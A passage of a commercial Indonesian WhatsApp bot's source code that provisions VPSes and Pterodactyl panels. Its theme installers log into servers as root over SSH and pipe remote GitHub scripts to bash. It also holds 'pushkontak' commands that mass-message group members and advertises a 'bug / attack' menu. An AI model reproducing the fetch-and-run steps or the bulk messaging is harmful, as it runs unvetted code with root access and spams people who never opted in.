    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return Reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await Reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//isntalltema
case 'buyonlu': {
        if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return Reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
    let menu = `
    𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙋𝙞𝙡𝙞𝙝 𝙏𝙚𝙢𝙖 𝙔𝙖𝙣𝙜 𝙄𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙄𝙣𝙨𝙩𝙖𝙡𝙡
    𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙣𝙜𝙞𝙣𝙨𝙩??𝙡𝙡 𝙉𝙚𝙗𝙪𝙡𝙖 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝘿𝙚𝙥𝙚𝙣𝙙 𝘿𝙪𝙡𝙪
    `;
const MenuX = {
        interactiveMessage: {
            title: menu,
            footer: "Kelpin Official",
            thumbnail: "https://img2.pixhost.to/images/7564/720789337_kelpinn.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({}),
                buttons: [
                    {
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "\ud83d\udce6 Kategori Fitur",
rows: [
{ header: "Tema Enigma", title: "Install tema Enigma", id: `${prefix}installtemaenigma` },
{ header: "Tema Nightcore", title: "Install tema Nightcore", id: `${prefix}installtemanightcore` },
{ header: "Tema Stellar", title: "Install tema Stellar", id: `${prefix}installtemastellar` },
{ header: "Tema Billing", title: "Install tema Billing", id: `${prefix}installtemabilling` },
{ header: "Tema Nebula", title: "Install tema Nebula", id: `${prefix}installtemanebula` },
{ header: "Install Depend", title: "Instalar dependencias VPS", id: `${prefix}installdepend` },
{ header: "Uninstall Tema", title: "Remover tema Pterodactyl", id: `${prefix}uninstallthema` },
{ header: "Back to Menu", title: "Kembali ke menu utama", id: `${prefix}menu` }
]
}
]
})
},
{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemaenigma",
                            id: `${prefix}installtemaenigma`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemanightcore",
                            id: `${prefix}installtemanightcore`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemastellar",
                            id: `${prefix}installtemastellar`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemabilling",
                            id: `${prefix}installtemabilling`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemanebula",
                            id: `${prefix}installtemanebula`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installdepend",
                            id: `${prefix}installdepend`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "uninstallthema",
                            id: `${prefix}uninstallthema`
            })
          }
        ]
      }
    }
  };

  await conn.sendMessage(m.chat, MenuX, { quoted: qpayment });
}
break 

case "uninstallthema": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await Reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
Reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283192054753\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
Reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemanightcore": case "installtemanightcore": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installdepend": {
    if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        Reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await Reply("Berhasil install Depend silakan ketik .installnebula ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

case "installtemanebula": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingb": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return Reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
Reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return Reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await Reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await Reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("pesannya"))
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break
case "info":
case "request": {
    let teks = `*${greeting()}* ${pushname}, Perkenalkan saya adalah bot WhatsApp
yang diciptakan oleh *Kelpin*, tujuannya untuk membantu berbagai
kebutuhan seperti tools, group
management, dan fitur lainnya.

Bot ini hadir bukan hanya untuk menjawab perintahmu, tapi juga menemani aktivitas chatmu,
memberikan hiburan, dan membantu berbagai kebutuhan di grup maupun chat pribadi.

✨ Fitur Unggulan:
- .polling <custom polling>
- .bugmenu   < main script >
- .addcase   <  add fitur >
- .upch   < upedia ke ch >
- .swdl    < status downloader >
- .swgrup   < up story in group >
- .sticker  < img to sticker >
- .brat    < text to sticker >
- .getpp     < get pp user >
- .payment  < setting payment >
- .ytmp3   < dl audio youtube >
- .tagall  < mention all user gb >
- .play      < search youtube >
- .tiktok    < tiktok downloader >
- .instagram   < ig downloader >
- .twitter  < twitter downloader >
- .kelpin → Tanya AI kapan saja
- .tebakkata → Tebak-tebakan seru
- .tourl → Upload file ke URL
- .sticker → Buat stiker langsung
- .quote → Quote inspiratif atau lucu

💡 Cara Request Fitur:
1. Tulis ide fitur lengkap dengan deskripsi
2. Hubungi Kontak Kelpin Gv untuk mengirim ide/fitur
3. Tunggu konfirmasi dari  Kelpin Gv
4. Fitur yang bermanfaat akan ditambahkan di update berikutnya

📞 Hubungi Owner / Kelpin Gv:
- wa.me/6283192054753
- Gunakan untuk pertanyaan serius, report bug, atau request pribadi
- Mohon jangan spam / tag tanpa alasan, bot bisa mute sementara

⚠️ Tips Penggunaan:
- Ketik .panduan ntuk melihat rules Script
- Gunakan bot dengan bijak
- Jangan spam perintah bertubi-tubi
- Nikmati fitur hiburan dengan etika
- Ikuti panduan menu yang tersedia

Semoga pengalaman menggunakan Pahina Md menyenangkan, interaktif, dan bermanfaat! 
`;

    let vid = await generateWAMessageContent({
        video: {
            url: "https://cdn.nekohime.site/file/5L3fjZaq.mp4"
        },
        gifPlayback: true
    }, { upload: conn.waUploadToServer });

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({

                    header: {
                        hasMediaAttachment: true,
                        videoMessage: vid.videoMessage
                    },

                    body: {
                        text: teks
                    },

                    footer: {
                        text: "Kelpin Gv"
                    },

                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({}),

                        buttons: [
                            {
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "\ud83d\udce6 Kategori Fitur",
rows: [
{ header: "All Menu", title: "Lihat semua fitur", id: `${prefix}semua` },
{ header: "Bug Fitur", title: "Fitur bug / attack", id: `${prefix}bugmenu` },
{ header: "Buy Script", title: "Info pembelian script", id: `${prefix}buysc` },
{ header: "Payment Info", title: "Info pembayaran (QRIS)", id: `${prefix}qris` },
{ header: "Back to Menu", title: "Kembali ke menu utama", id: `${prefix}menu` }
]
}
]
})
},
{
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Contact Developer",
                                    url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Back Menu",
                                    id: `${prefix}menu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "All Menu",
                                    id: `${prefix}semua`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Buy Script",
                                    id: `${prefix}buysc`
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Saluran Developer",
                                    url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
                                })
                            }
                        ]
                    },

                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
                            newsletterJid: "120363426723637081@newsletter",
                            serverMessageId: 1
                        }
                    }

                })
            }
        }
    }, { quoted: qtoko });

    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cpanel': {
  let pe = `${greeting()} ${pushname}, perkenalkan saya adalah bot Whatsapp yang diciptakan oleh *kelpin*, bertujuan untuk membantu anda
    
╭┈ ˚ ·━━━━━━━━━━━━━━━━
│┃꒰ 𖢷 *Name Bot  » MutanoX-BotMD*
│┃꒰ 𖢷 *Developer* » *Kelpin Gv*
│┃꒰ 𖢷 *Version  »  Type-V5.0.0*
│┃꒰ 𖢷 *Language » JavaScript*
│┃꒰ 𖢷 *RunTime   »  ${runtime(process.uptime())}*
│┃꒰ 𖢷 *Feature  » Multy&Bug*
│┃꒰ 𖢷 *StatusScript  » buyVip/buyer*
╰——————・・・・————・・・

╭━〔 CPANEL SERVER 1 〕━
│
│ .5gb1 < username >
│ .6gb1 < username >
│ .7gb1 < username >
│ .8gb1 < username >
│ .9gb1 < username >
│ .10gb1 < username >
│ .unli1 < username >
│
╰━━━━━━━━━━━━━━━

╭━〔 CPANEL SERVER 2 〕━
│
│ .1gb-v2 < username >
│ .2gb-v2 < username >
│ .3gb-v2 < username >
│ .4gb-v2 < username >
│ .5gb-v2 < username >
│ .6gb-v2 < username >
│ .7gb-v2 < username >
│ .8gb-v2 < username >
│ .9gb-v2 < username >
│ .10gb-v2 < username >
│ .unli-v2 < username >
│
╰━━━━━━━━━━━━━━━━

╭━〔 CPANEL MANAGEMENT 〕━
│
│ .listpanel < button >
│ .delpanel < button >
│ .cadmin < username >
│ .deladmin < button >
│ .listserver < serverpanel >
│ .addpremium < akses >
│ .addowner < akses >
│
╰━━━━━━━━━━━━━━━━

 `

  // kirim gambar
  await conn.sendMessage(m.chat, {
interactiveMessage: {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
},

title: pe,
footer: "> `𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲: 𝐤𝐞𝐥𝐩𝐢𝐧 𝐠𝐯`",
thumbnail: "https://img2.pixhost.to/images/7564/720789111_kelpinn.jpg",

nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "MutanoX-BotMD",
url: "https://wa.me/6283192054753",
copy_code: "35.000 IDR",
expiration_time: Date.now() * 999
}
}),

buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "BACK MENU",
id: `${prefix}menu`
})
}
]
}
}
}, { quoted: lol })
await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu2.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
}, { quoted: qtoko })

  //kirim audio
await conn.sendMessage(m.chat, {
    audio: fs.readFileSync(randomAudio),
    mimetype: 'audio/mp4',
    ptt: true
}, { quoted: m })
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!args[0]) return Reply('Contoh: .5gb1 username')
let username = args[0].toLowerCase()
var ram
var disknya
var cpu

if (command == "5gb1") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb1") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb1") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb1") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb1") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb1") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `  
         *📦AKUN PANEL ANDA📦*

📌 *Detail Akun:* 
━━━━━━━━━━━━━
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  

   *👑 SPEK PANEL*
*💾 Ram : ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
*💾 Disk : ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
*💾 CPU : ${cpu == "0" ? "Unlimited" : cpu+"%"}* 

⚠️ *Peraturan Penting:*  
1️⃣ *Dilarang* menggunakan script *DDoS*.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer). 
━━━━━━━━━━━━━━ 

💾 Simpan data akun Anda dengan baik dan bijak!
> kelpin Gv`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: qloc})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "self": {
if (!isOwner) return Reply(msg.owner)
conn.public = false
Reply("Berhasil mengganti mode bot menjadi *Self*")
}
break      

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'swdl': {
    if (!m.quoted) return Reply('❌ Reply status WhatsApp yang mau di-download')

    let q = m.quoted
    let mime = (q.msg || q).mimetype || ''

    if (!/image|video/.test(mime)) {
        return Reply('❌ Status harus berupa foto atau video')
    }

    let media = await q.download()

    if (/image/.test(mime)) {
        await conn.sendMessage(m.chat, {
            image: media,
            caption: '📥 Status WhatsApp berhasil di-download'
        }, { quoted: m })
    } else if (/video/.test(mime)) {
        await conn.sendMessage(m.chat, {
            video: media,
            caption: '📥 Status WhatsApp berhasil di-download'
        }, { quoted: lol })
    }
}
break
//TOOLSMENU
case "number-info": {
  if (!q) return Reply("Masukkan nomor!\nContoh: .number-info 628123456789");

  let nomor = q.replace(/[^0-9]/g, "");
  if (nomor.startsWith("0")) nomor = "62" + nomor.slice(1);
  if (!/^\d+$/.test(nomor)) return Reply("Nomor tidak valid!");

  const jid = nomor + "@s.whatsapp.net";

  // ===== STATUS WHATSAPP =====
  let waStatus = "Tidak terdaftar / Terbanned";
  let isActive = false;

  try {
    const cek = await conn.onWhatsApp(jid);
    if (cek?.length) {
      waStatus = "Aktif";
      isActive = true;
    }
  } catch {
    waStatus = "Tidak dapat dicek";
  }

  // ===== NEGARA =====
  const countries = {
  "1": "Amerika Serikat / Kanada",
  "7": "Rusia",
  "20": "Mesir",
  "27": "Afrika Selatan",
  "30": "Yunani",
  "31": "Belanda",
  "32": "Belgia",
  "33": "Perancis",
  "34": "Spanyol",
  "36": "Hongaria",
  "39": "Italia",
  "40": "Rumania",
  "41": "Swiss",
  "43": "Austria",
  "44": "Inggris",
  "45": "Denmark",
  "46": "Swedia",
  "47": "Norwegia",
  "48": "Polandia",
  "49": "Jerman",
  "51": "Peru",
  "52": "Meksiko",
  "53": "Kuba",
  "54": "Argentina",
  "55": "Brasil",
  "56": "Cile",
  "57": "Kolombia",
  "58": "Venezuela",
  "60": "Malaysia",
  "61": "Australia",
  "62": "Indonesia",
  "63": "Filipina",
  "64": "Selandia Baru",
  "65": "Singapura",
  "66": "Thailand",
  "81": "Jepang",
  "82": "Korea Selatan",
  "84": "Vietnam",
  "86": "Cina",
  "90": "Turki",
  "91": "India",
  "92": "Pakistan",
  "98": "Iran",
  "212": "Maroko",
  "213": "Aljazair",
  "216": "Tunisia",
  "218": "Libya",
  "220": "Gambia",
  "221": "Senegal",
  "222": "Mauritania",
  "223": "Mali",
  "224": "Guinea",
  "225": "Pantai Gading",
  "226": "Burkina Faso",
  "227": "Niger",
  "228": "Togo",
  "229": "Benin",
  "230": "Mauritius",
  "231": "Liberia",
  "232": "Sierra Leone",
  "233": "Ghana",
  "234": "Nigeria",
  "235": "Chad",
  "236": "Republik Afrika Tengah",
  "237": "Kamerun",
  "238": "Tanjung Verde",
